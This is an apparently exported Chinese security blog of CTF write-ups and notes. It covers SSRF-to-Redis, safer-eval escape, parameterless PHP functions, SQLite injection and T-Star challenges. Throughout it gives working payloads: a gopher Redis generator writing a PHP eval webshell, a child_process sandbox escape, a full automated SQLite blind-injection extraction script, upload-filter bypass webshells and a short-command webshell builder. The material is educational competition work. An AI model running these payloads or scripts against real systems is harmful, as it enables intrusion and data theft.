<h2 id="老八小超市儿"><a href="#老八小超市儿" class="headerlink" title="老八小超市儿"></a>老八小超市儿</h2><p>直接网上搜shopX0 getshell <a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener">http://www.nctry.com/1660.html</a></p>
<p>那道shell之后呢，发现根目录下的flag是假的，还有个hint。不知道这个hint有啥用，但是在auto.sh有一个很明显的地方</p>
<pre><code>#!/bin/sh
while true; do (python /var/mail/makeflaghint.py &amp;) &amp;&amp; sleep 60; done</code></pre><p>这里应该设定了定时任务每60秒执行一次这个脚本，而且这个makeflaghint.py 脚本我们有权限修改。我们直接修改脚本就能读到/root/flag。</p>
<pre><code class="python">f = open(&#39;/root/flag&#39;,&#39;r&#39;)
f2 = open(&#39;/666.txt&#39;,&#39;w&#39;)
flag = f.read()
f2.write(flag)
f.close()
f2.close()</code></pre>
<h2 id="EZ三剑客-EzWeb"><a href="#EZ三剑客-EzWeb" class="headerlink" title="EZ三剑客-EzWeb"></a>EZ三剑客-EzWeb</h2><p>这道题和安恒还是广东强网某道题基本一样。也是SSRF打Redis.</p>
<p>SSRF对内网IP进行探测然后对端口探测发现是Redis，然后EXP一把梭。</p>
<pre><code class="python">import urllib
import urllib.parse
protocol=&quot;gopher://&quot;
ip=&quot;173.138.94.11&quot;
port=&quot;6379&quot;
shell=&#39;\n\n&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;\n\n&#39;
filename=&quot;shell.php&quot;
path=&quot;/var/www/html&quot;
passwd=&quot;&quot;
cmd=[&quot;flushall&quot;,
     &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),
     &quot;config set dir {}&quot;.format(path),
     &quot;config set dbfilename {}&quot;.format(filename),
     &quot;save&quot;
     ]
if passwd:
    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
def redis_format(arr):
    CRLF=&quot;\r\n&quot;
    redis_arr = arr.split(&quot; &quot;)
    cmd=&quot;&quot;
    cmd+=&quot;*&quot;+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
    cmd+=CRLF
    return cmd

if __name__==&quot;__main__&quot;:
    for x in cmd:
        payload += urllib.parse.quote(redis_format(x))
    print(payload)</code></pre>
<pre><code>gopher://173.138.94.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</code></pre><p>最后读flag需要绕一下空格。</p>
<h2 id="cve版签到"><a href="#cve版签到" class="headerlink" title="cve版签到"></a>cve版签到</h2><pre><code>?url=http://127.0.0.123%00.ctfhub.com</code></pre><h2 id="EZ三剑客-EzNode"><a href="#EZ三剑客-EzNode" class="headerlink" title="EZ三剑客-EzNode"></a>EZ三剑客-EzNode</h2><pre><code class="javascript">const express = require(&#39;express&#39;);
const bodyParser = require(&#39;body-parser&#39;);

const saferEval = require(&#39;safer-eval&#39;); // 2019.7/WORKER1 找到一个很棒的库

const fs = require(&#39;fs&#39;);

const app = express();


app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// 2020.1/WORKER2 老板说为了后期方便优化
app.use((req, res, next) =&gt; {
  if (req.path === &#39;/eval&#39;) {
    let delay = 60 * 1000;
    console.log(delay);
    if (Number.isInteger(parseInt(req.query.delay))) {
      delay = Math.max(delay, parseInt(req.query.delay));
    }
    const t = setTimeout(() =&gt; next(), delay);
    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
    setTimeout(() =&gt; {
      clearTimeout(t);
      console.log(&#39;timeout&#39;);
      try {
        res.send(&#39;Timeout!&#39;);
      } catch (e) {

      }
    }, 1000);
  } else {
    next();
  }
});

app.post(&#39;/eval&#39;, function (req, res) {
  let response = &#39;&#39;;
  if (req.body.e) {
    try {
      response = saferEval(req.body.e);
    } catch (e) {
      response = &#39;Wrong Wrong Wrong!!!!&#39;;
    }
  }
  res.send(String(response));
});

// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
app.get(&#39;/source&#39;, function (req, res) {
  res.set(&#39;Content-Type&#39;, &#39;text/javascript;charset=utf-8&#39;);
  res.send(fs.readFileSync(&#39;./index.js&#39;));
});

// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口
app.get(&#39;/version&#39;, function (req, res) {
  res.set(&#39;Content-Type&#39;, &#39;text/json;charset=utf-8&#39;);
  res.send(fs.readFileSync(&#39;./package.json&#39;));
});

app.get(&#39;/&#39;, function (req, res) {
  res.set(&#39;Content-Type&#39;, &#39;text/html;charset=utf-8&#39;);
  res.send(fs.readFileSync(&#39;./index.html&#39;))
})

app.listen(80, &#39;0.0.0.0&#39;, () =&gt; {
  console.log(&#39;Start listening&#39;)
});</code></pre>
<h4 id="小trick"><a href="#小trick" class="headerlink" title="小trick"></a>小trick</h4><ul>
<li><p>setTimeout ，整数溢出，Infinity或者 ⼤于 2147483647</p>
</li>
<li><p>safeval <a href="https://github.com/commenthol/safer-eval/issues/10" target="_blank" rel="noopener">https://github.com/commenthol/safer-eval/issues/10</a></p>
</li>
</ul>
<pre><code>setInterval.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;).toString();</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200527142405.png" alt="微信截图_20200527142405"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>复现ByteCTF-boringcode</title>
    <url>//articles/d5c8fc5c96.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次比赛没做出来，看着大佬的write up复现，思路真的很骚。</p>
<h2 id="Boringcode"><a href="#Boringcode" class="headerlink" title="Boringcode"></a>Boringcode</h2><ul>
<li><strong>源码</strong></li>
</ul>
<pre><code class="php">&lt;?php
function is_valid_url($url) {
    if (filter_var($url, FILTER_VALIDATE_URL)) {
        if (preg_match(&#39;/data:\/\//i&#39;, $url)) {
            return false;
        }
        return true;
    }
    return false;
}

if (isset($_POST[&#39;url&#39;])){
    $url = $_POST[&#39;url&#39;];
    if (is_valid_url($url)) {
        $r = parse_url($url);
        if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) {
            $code = file_get_contents($url);
            if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
                if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
                    echo &#39;bye~&#39;;
                } else {
                    eval($code);
                }
            }
        } else {
            echo &quot;error: host not allowed&quot;;
        }
    } else {
        echo &quot;error: invalid url&quot;;
    }
}else{
    highlight_file(__FILE__);
}</code></pre>
<h3 id="考点1"><a href="#考点1" class="headerlink" title="考点1"></a>考点1</h3><pre><code class="php"> if (is_valid_url($url)) {
        $r = parse_url($url);
        if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) {
            $code = file_get_contents($url);</code></pre>
<p>这里如果没有<code>is_valid_url($url)</code>是可以使用data伪协议进行绕过，但是<code>is_valid_url($url)</code>对data进行了过滤使用伪协议这条数行不通，但是也学到了data伪协议可以绕过域名的限制。,但是绕过该点要不一个baidu的鸡肋跳转漏洞要不就是买个xxxbaidu.com的域名。</p>
<p>例如：</p>
<pre><code class="php">&lt;?php
$url = $_POST[&#39;url&#39;];
$r = parse_url($url);
if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) {
            $code = file_get_contents($url);
        }

eval($code);
?&gt;</code></pre>
<p>payload:</p>
<pre><code class="php">url=data://baidu.com/plain;base64,cGhwaW5mbygpOw==</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191007/15704299387377.png" alt="img"></p>
<hr>
<h3 id="考点2"><a href="#考点2" class="headerlink" title="考点2"></a>考点2</h3><pre><code class="php">if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
                if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
                    echo &#39;bye~&#39;;
                } else {
                    eval($code);
                }</code></pre>
<p>这里会把函数给替换为空，如果替换结果剩下一个<code>“；”</code>那么就可以绕过这个正则。</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191007/15704330592656.png" alt="img"></p>
<p>可以观察到，这个正则只会匹配函数为纯字母并且参数为空的payload。也就是说我们传入的值必须是一个只含字母并且没有参数的函数的payload.同时可以注意到这个是可以进行一个函数的套用。那就是说让我们构造多个空参数的函数去读取flag.</p>
<p>我们看如下几个函数：</p>
<pre><code class="php">scandir() 
    var_dump(scandir(&#39;.&#39;));
    array(3) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; } </code></pre>
<p>了一看到<code>scandir(&#39;.&#39;)</code>能够返回当前目录的文件列表的数组，那么怎么取出文件名和读取文件呢，可以使用：</p>
<pre><code class="php">end()//读取数组最后一个元素
readfile()//输出一个文件</code></pre>
<p>那么就可以构造如下payload:</p>
<pre><code class="php">readfile(end(scandir(&#39;.&#39;)))</code></pre>
<p>问题又来了，我们不不能够有这个参数那么点又如何构造呢？从大佬的write up中看到两个方法。</p>
<ol>
<li><pre><code class="php">localeconv()
    var_dump(localeconv());
    array(18) { 
        [&quot;decimal_point&quot;]=&gt; string(1) &quot;.&quot; 
        [&quot;thousands_sep&quot;]=&gt; string(0) &quot;&quot; 
        [&quot;int_curr_symbol&quot;]=&gt; string(0) &quot;&quot;
        [&quot;currency_symbol&quot;]=&gt; string(0) &quot;&quot; 
        [&quot;mon_decimal_point&quot;]=&gt; string(0) &quot;&quot;
        .......
    } </code></pre>
</li>
</ol>
<p>该函数返回一个当地数字以及货币信息的数组，可以看到返回值第一个就是<code>“.”</code>,而与end()相反的取第一个元素的函数有:</p>
<pre><code class="php">current()       返回数组中的当前单元, 默认取第一个值
pos()           current() 的别名</code></pre>
<p>那么就可以构造如下payload.可以读取到文件本地文件。</p>
<pre><code class="php">readfile(end(scandir(pos(localeconv()))))</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191007/15704367249781.png" alt="img"></p>
<p>但是flag并不在本文件夹下，那么就需要用到改变当前目录的函数:</p>
<pre><code class="php">chdir() 函数改变当前的目录。
next() 函数将内部指针指向数组中的下一个元素，并输出。 这里可以获取到scandir()返回的&quot;..&quot;</code></pre>
<p>那么构造payload,j就可以跳转到上一目录了，大师chidr并不会返回目录列表,而是会返回一个bool值，我们怎么去读取文件呢:</p>
<pre><code class="php">chdir(next(scandir(pos(localeconv()))))</code></pre>
<p>这里可以使用if()语句，也就是当跳转目录成功时候就读取当前文件。构造如下payload:</p>
<pre><code class="php">if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))))</code></pre>
<ol start="2">
<li>当然还有另外的方法，利用当前秒数构造AIISC码再用<code>chr()</code>去转码生成字符。</li>
</ol>
<pre><code class="php">chr(pos(localtime()))</code></pre>
<p>这里出现了一个问题，这个<code>localtime()</code>只接受时间戳，那么这里又出现了其问题如果构造如下payload将无法执行。那么这里还需要不受参数影响的函数，那就<code>time()</code></p>
<pre><code class="php">chr(pos(localtime(chdir(next(scandir(pos(localeconv())))))))</code></pre>
<p>那么可以构造如下payload:</p>
<pre><code class="php">chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))</code></pre>
<p>整体构造：</p>
<pre><code class="php">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</code></pre>
<h3 id="无参数函数小总结"><a href="#无参数函数小总结" class="headerlink" title="无参数函数小总结"></a>无参数函数小总结</h3><p>这里是针对无参数函数利用来说的。</p>
<pre><code class="php">getchwd() 函数返回当前工作目录。
scandir() 函数返回指定目录中的文件和目录的数组。
dirname() 函数返回路径中的目录部分。
chdir() 函数改变当前的目录。

readfile()  输出一个文件

current()       返回数组中的当前单元, 默认取第一个值
pos()           current() 的别名
next() 函数将内部指针指向数组中的下一个元素，并输出。
end()       将内部指针指向数组中的最后一个元素，并输出。
array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。

chr() 函数从指定的 ASCII 值返回字符。
hex2bin — 转换十六进制字符串为二进制字符串

getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)</code></pre>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a herf="https://xz.aliyun.com/t/6316#toc-9">ByteCTF一道题的分析与学习PHP无参数函数的利用</a></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlite注入以及PHP使用sqlite笔记</title>
    <url>//articles/d5d15ec4e7.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前比赛被sqlite注入坑了，网上能找到的资料比较少，不过已经足够了，在此做一下笔记。</p>
<h3 id="PHP使用SQLITE"><a href="#PHP使用SQLITE" class="headerlink" title="PHP使用SQLITE"></a>PHP使用SQLITE</h3><ul>
<li><strong>连接数据库</strong></li>
</ul>
<p>PHP中自带处理sqlite的类，要使用直接继承SQLite3类然后重写构造方法<code>__construct()</code>指定db文件</p>
<pre><code class="php">class MyDB extends SQLite3
   {
      function __construct()
      {
         $this-&gt;open(&#39;test.db&#39;);
      }
   }</code></pre>
<p>实例化类，判断是否连接成功</p>
<pre><code class="php">$db = new MyDB();
   if(!$db){
      echo $db-&gt;lastErrorMsg();
   } else {
      echo &quot;Opened database successfully\n&quot;;
   }</code></pre>
<ul>
<li>执行SQL语句，以查询为例，其他与mysql无异。</li>
</ul>
<pre><code class="php">$sql =&lt;&lt;&lt;EOF
      SELECT * from hex where id = &#39;$id&#39;;
EOF;
$result = $db-&gt;query($sql);
$data = $result-&gt;fetchArray(SQLITE3_ASSOC);
echo $data[&#39;hex&#39;];</code></pre>
<h3 id="SQLITE的注入"><a href="#SQLITE的注入" class="headerlink" title="SQLITE的注入"></a>SQLITE的注入</h3><h5 id="UNION联合注入"><a href="#UNION联合注入" class="headerlink" title="UNION联合注入"></a>UNION联合注入</h5><ul>
<li>sqlite3和mysql5.5以后一样存在一个表记录了数据库和表的信息。</li>
</ul>
<p><img src="C:%5CUsers%5C51763%5CDesktop%5C894761-20160811111720934-461357319.png" alt="894761-20160811111720934-461357319"></p>
<ul>
<li>可以看到记录了表名，表结构，那么我们就可以直接通过这个隐藏表来查询sqlite数据库里面的表名。</li>
</ul>
<pre><code class="url">http://127.0.0.1/?id=-1&#39; union select 1,(select group_concat(name)from sqlite_master)--+</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191004/15701606229929.png" alt="img"></p>
<ul>
<li>查看表结构<pre><code class="url">http://127.0.0.1/?id=-1&#39; union select 1,(select group_concat(sql)from sqlite_master where name=&#39;flag&#39;)--+</code></pre>
</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191004/15701607258796.png" alt="img"></p>
<ul>
<li>查看数据<pre><code class="url">http://127.0.0.1/?id=-1&#39; union select 1,(select group_concat(flag)from flag where id=&#39;1&#39;)--+</code></pre>
</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191004/15701608704994.png" alt="img"></p>
<ul>
<li>写文件(实验失败)</li>
</ul>
<pre><code>http://127.0.0.1/?id=1&#39;;ATTACH DATABASE &#39;E:\\phpStudy\\PHPTutorial\\WWW\\xiaozi.php&#39; AS pwn ; CREATE TABLE pwn.exp (dataz text) ; INSERT INTO pwn.exp (dataz) VALUES (&#39; &lt;?php phpinfo(); ?&gt; &#39;); --</code></pre><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p>bool盲注：</p>
<ul>
<li><strong>检测表的个数</strong></li>
</ul>
<pre><code class="sqlite">&#39; and  (select COUNT(name) from sqlite_master where type=&#39;table&#39;)=表的个数</code></pre>
<ul>
<li><p>payload解释</p>
<p>COUNT()检测表的个数，用于爆破表个数</p>
</li>
<li><p>自动检测脚本编写</p>
</li>
</ul>
<pre><code class="python">def tables_count(self):
            for i in range(1,255):
                payload = self.url + &quot;&#39; and  (select COUNT(name) from sqlite_master where type=&#39;table&#39;)=%d --+&quot;%(i)
                result = self.r.get(payload)
                if result.text == self.contents:
                    print(&#39;Tables count is %d&#39;%(i))</code></pre>
<hr>
<ul>
<li><strong>检测表名长度</strong></li>
</ul>
<pre><code class="python">&#39; and  (select LENGTH(name) from sqlite_master where type=&#39;table&#39; limit 第几个表名,1)=长度 --+</code></pre>
<ul>
<li><p>payload解释</p>
<p>LENGTH()用于检测字符串长度，limit限定第一条数据以爆破字符长度</p>
</li>
<li><p>自动检测脚本demo</p>
</li>
</ul>
<pre><code class="python">def table_name_len(self,count):
            for j in range(0,count):
                for i in range(1,255):
                    payload = self.url + &quot;&#39; and  (select LENGTH(name) from sqlite_master where type=&#39;table&#39; limit %d,1)=%d --+&quot;%(j,i)
                    result = self.r.get(payload)
                    if result.text == self.contents:
                        print(&#39;Tables(%d) name length is %d&#39;%(j,i))</code></pre>
<ul>
<li><strong>爆表名</strong></li>
</ul>
<pre><code class="sqlite">?id=1&#39; and  substr((select name from sqlite_master where type=&#39;table&#39; limit 0,1),1,1)=&#39;f&#39; --+
或者
?id=1&#39; and  substr((select name from sqlite_master where type=&#39;table&#39; limit 0,1),1,1) like &#39;a&#39; --+</code></pre>
<ul>
<li>payload解释</li>
</ul>
<pre><code class="sqlite">substr((payload),第几位,步长)
例如:
substr((payload),1,1)=&#39;f&#39; --判断第一位字符是不是f</code></pre>
<ul>
<li>自动脚本编写</li>
</ul>
<pre><code class="python">def table_name(self,count,num):
            tablename = &#39;&#39;
            for j in range(count):
                for i in range(40,125):
                    payload = self.url + &quot;&#39;and  substr((select name from sqlite_master where type=&#39;table&#39; limit %d,1),%d,1)=&#39;%s&#39; --+&quot;%(num,j,str(chr(i)))
                    result=self.r.get(payload)
                    if result.text == self.contents:
                        tablename = tablename +str(chr(i))
            self.table_structure(tablename)
            print(&#39;Tables (%d) name is %s&#39;%(num,tablename))</code></pre>
<ul>
<li><p><strong>爆表结构</strong></p>
<p>爆表结构也就是爆sqlite_master的sql字段，与爆表名类似</p>
</li>
<li><p>自动脚本编写</p>
<pre><code class="python">def table_structure(self,tablename):
          tablecolums = &#39;&#39;
          for i in range(1,255):
                  payload = self.url + &quot;&#39; and  (select LENGTH(sql) from sqlite_master where name=&#39;%s&#39; )=%d --+&quot;%(tablename,i)
                  result = self.r.get(payload)
                  if result.text == self.contents:
                      len_sql=i
          for j in range(len_sql+1):
              for i in range(40,125):
                  payload = self.url + &quot;&#39;and  substr((select sql from sqlite_master where name=&#39;%s&#39;),%d,1)=&#39;%s&#39; --+&quot;%(tablename,j,str(chr(i)))    
                  result=self.r.get(payload)
                  if result.text == self.contents:
                      tablecolums = tablecolums +str(chr(i))
          print(tablecolums)            </code></pre>
</li>
<li><p>爆数据</p>
<p>爆数据也就是得知表结构之后，直接爆破对应的表名和表字段。</p>
</li>
</ul>
<pre><code class="python">def get_data(self,colums,table):
            data=&#39;&#39;
            for i in range(1,255):
                    payload = self.url + &quot;&#39; and  (select LENGTH(group_concat(%s)) from %s )=%d --+&quot;%(colums,table,i)
                    result = self.r.get(payload)
                    if result.text == self.contents:
                        len_data=i
                        sys.stdout.write(&#39;\r&#39;+&#39;[*]Payload:&#39;+payload)
                    sys.stdout.flush()

            for j in range(len_data+1):
                for i in range(40,125):
                    payload = self.url + &quot;&#39;and  substr((select group_concat(%s) from %s),%d,1)=&#39;%s&#39; --+&quot;%(colums,table,j,str(chr(i)))    
                    result = self.r.get(payload)
                    if result.text == self.contents:
                        data = data +str(chr(i))
                        sys.stdout.write(&#39;\r&#39;+self.OKGREEN+&#39;[*]Payload:&#39;+payload)
                    else:
                        sys.stdout.write(&#39;\r&#39;+self.FAIL+&#39;[*]Payload:&#39;+payload)
                    sys.stdout.flush()
            print(&#39;\n&#39;+self.OKGREEN+&#39;Data: &#39;+data)</code></pre>
<ul>
<li>整合脚本：</li>
</ul>
<pre><code class="python">import requests
import sys
class sqlite3inject:
        r =&#39;&#39;
        contents =&#39;&#39;
        url =&#39;&#39;
        HEADER = &#39;\033[95m&#39;
        OKBLUE = &#39;\033[94m&#39;
        OKGREEN = &#39;\033[92m&#39;
        WARNING = &#39;\033[93m&#39;
        FAIL = &#39;\033[91m&#39;
        ENDC = &#39;\033[0m&#39;        
        def __init__(self,url):
            self.url = url
            self.r = requests.session()
            self.contents = (self.r.get(self.url)).text

        def get_data(self,colums,table):
            data=&#39;&#39;
            for i in range(1,255):
                    payload = self.url + &quot;&#39; and  (select LENGTH(group_concat(%s)) from %s )=%d --+&quot;%(colums,table,i)
                    result = self.r.get(payload)
                    if result.text == self.contents:
                        len_data=i
                        sys.stdout.write(&#39;\r&#39;+&#39;[*]Payload:&#39;+payload)
                    sys.stdout.flush()

            for j in range(len_data+1):
                for i in range(40,125):
                    payload = self.url + &quot;&#39;and  substr((select group_concat(%s) from %s),%d,1)=&#39;%s&#39; --+&quot;%(colums,table,j,str(chr(i)))    
                    result = self.r.get(payload)
                    if result.text == self.contents:
                        data = data +str(chr(i))
                        sys.stdout.write(&#39;\r&#39;+self.OKGREEN+&#39;[*]Payload:&#39;+payload)
                    else:
                        sys.stdout.write(&#39;\r&#39;+self.FAIL+&#39;[*]Payload:&#39;+payload)
                    sys.stdout.flush()
            print(&#39;\n&#39;+self.OKGREEN+&#39;Data: &#39;+data)

        def table_structure(self,tablename):
            tablecolums = &#39;&#39;
            for i in range(1,255):
                    payload = self.url + &quot;&#39; and  (select LENGTH(sql) from sqlite_master where name=&#39;%s&#39; )=%d --+&quot;%(tablename,i)
                    result = self.r.get(payload)
                    if result.text == self.contents:
                        len_sql=i
            for j in range(len_sql+1):
                for i in range(40,125):
                    payload = self.url + &quot;&#39;and  substr((select sql from sqlite_master where name=&#39;%s&#39;),%d,1)=&#39;%s&#39; --+&quot;%(tablename,j,str(chr(i)))    
                    result=self.r.get(payload)
                    if result.text == self.contents:
                        tablecolums = tablecolums +str(chr(i))
            print(tablecolums)            
        def table_name(self,count,num):
            tablename = &#39;&#39;
            for j in range(count):
                for i in range(40,125):
                    payload = self.url + &quot;&#39;and  substr((select name from sqlite_master where type=&#39;table&#39; limit %d,1),%d,1)=&#39;%s&#39; --+&quot;%(num,j,str(chr(i)))
                    result=self.r.get(payload)
                    if result.text == self.contents:
                        tablename = tablename +str(chr(i))
            self.table_structure(tablename)
            print(&#39;Tables (%d) name is %s&#39;%(num,tablename))

        def table_name_len(self,count):
            for j in range(0,count):
                for i in range(1,255):
                    payload = self.url + &quot;&#39; and  (select LENGTH(name) from sqlite_master where type=&#39;table&#39; limit %d,1)=%d --+&quot;%(j,i)
                    result = self.r.get(payload)
                    if result.text == self.contents:
                        print(&#39;Tables(%d) name length is %d&#39;%(j,i))
                        self.table_name(i+1,j)


        def tables_count(self):
            for i in range(1,255):
                payload = self.url + &quot;&#39; and  (select COUNT(name) from sqlite_master where type=&#39;table&#39;)=%d --+&quot;%(i)
                result = self.r.get(payload)
                if result.text == self.contents:
                    print(&#39;Tables count is %d&#39;%(i))
                    return self.table_name_len(i)

inject = sqlite3inject(&#39;http://127.0.0.1/?id=1&#39;)        
inject.tables_count()</code></pre>
<ul>
<li>测试效果</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191004/15701919083104.png" alt="img"></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>2020腾讯犀牛鸟网络安全T-Star高校挑战赛Writeup</title>
    <url>//articles/d5d57dc873.html</url>
    <content><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><ul>
<li>js过滤，直接抓包改后缀getflag即可</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200630150552.png" alt="微信图片_20200630150552"></p>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200630150634.png" alt="微信截图_20200630150634"></p>
<h2 id="命令执行基础"><a href="#命令执行基础" class="headerlink" title="命令执行基础"></a>命令执行基础</h2><ul>
<li>直接管道符执行其他命令即可</li>
</ul>
<pre><code>baidu.com | cat  ../key.php</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200630150908.png" alt="微信截图_20200630150908"></p>
<h2 id="你能爆破吗"><a href="#你能爆破吗" class="headerlink" title="你能爆破吗"></a>你能爆破吗</h2><ul>
<li><p>burpsuite爆破密码账号都是admin，登陆成功会set一个cookie，cookie是用户名的base64。</p>
</li>
<li><p>payload</p>
</li>
</ul>
<pre><code>-admin&quot;union select 1,(select group_concat(flag) from flag),3-- </code></pre><ul>
<li>base64</li>
</ul>
<pre><code>LWFkbWluInVuaW9uIHNlbGVjdCAxLChzZWxlY3QgZ3JvdXBfY29uY2F0KGZsYWcpIGZyb20gZmxhZyksMy0tIA==</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200630151339.png" alt="微信截图_20200630151339"></p>
<h2 id="文件包含GetShell"><a href="#文件包含GetShell" class="headerlink" title="文件包含GetShell"></a>文件包含GetShell</h2><ul>
<li>右键看源码提示了<code>lfi.txt</code>拿到<code>lfi.php</code>的源码</li>
</ul>
<pre><code class="php">&lt;?php
$file = $_REQUEST[&#39;file&#39;];
if ($file != &#39;&#39;) {
    $inc = sprintf(&quot;%s.php&quot;, $file); // only php file can be included
    include($inc);
}
?&gt;</code></pre>
<ul>
<li>直接PHP伪协议去读flag.php源码即可。</li>
</ul>
<pre><code>file=php://filter/read=convert.base64-encode/resource=flag</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200630151723.png" alt="微信图片_20200630151723"></p>
<ul>
<li>base64解码得到flag:</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200630151835.png" alt="微信截图_20200630151835"></p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><ul>
<li>对&lt;?、php、eval等进行了过滤，过滤比较简单直接替换为空，直接双写就能绕过，eval直接利用php对大小写不敏感绕过。</li>
<li>payload</li>
</ul>
<pre><code>&lt;php?&lt;?p&lt;?phphp EVAL($_GET[&#39;cmd&#39;]);?&gt;</code></pre><ul>
<li>文件后缀fuzz发现pht能解析，所以最终解法，上传个图片然后插入上面的payload即可getshell.</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200630152459.png" alt="微信截图_20200630152459"></p>
<ul>
<li><p>getflag</p>
</li>
<li><pre><code>http://1c74d0d4.yunyansec.com/upload/1593501867.pht?cmd=var_dump(file_get_contents(%27../../key%27));</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200630152629.png" alt="微信截图_20200630152629"></p>
</li>
</ul>
<p>-</p>
<h2 id="分析代码获得flag"><a href="#分析代码获得flag" class="headerlink" title="分析代码获得flag"></a>分析代码获得flag</h2><p>源码：</p>
<pre><code class="php">&lt;?php
show_source(__FILE__);
error_reporting(0);
if(strlen($_GET[1])&lt;7){
     echo shell_exec($_GET[1]);
}

?&gt;</code></pre>
<p>p神之前在小密圈发过一份奇淫技巧，里面就有这么一招，但这里限制了7字符，小密圈里面的是8字符，恰好</p>
<p><code>ls -t&gt;x</code>长度不符合要求没办法用，这里可以用奇淫技巧里面换行的办法把<code>ls -t&gt;x</code>写到文件里面然后用sh执行。</p>
<p>网上找的paylaod在ls -t之间少了一个空格没办法执行，尝试之后ls分开写，然后s加空格可以写到ls -t:</p>
<pre><code>&gt;l\\
&gt;s\ \\
ls&gt;_
&gt;\ \\
&gt;-t\\
&gt;\&gt;y
ls&gt;&gt;_</code></pre><p>然后就可以愉快的写wenshell了：</p>
<pre><code>&gt;hp
&gt;1.p\\
&gt;d\&gt;\\
&gt;\ -\\
&gt;e64\\
&gt;bas\\
&gt;7\|\\
&gt;XSk\\
&gt;Fsx\\
&gt;dFV\\
&gt;kX0\\
&gt;bCg\\
&gt;XZh\\
&gt;AgZ\\
&gt;waH\\
&gt;PD9\\
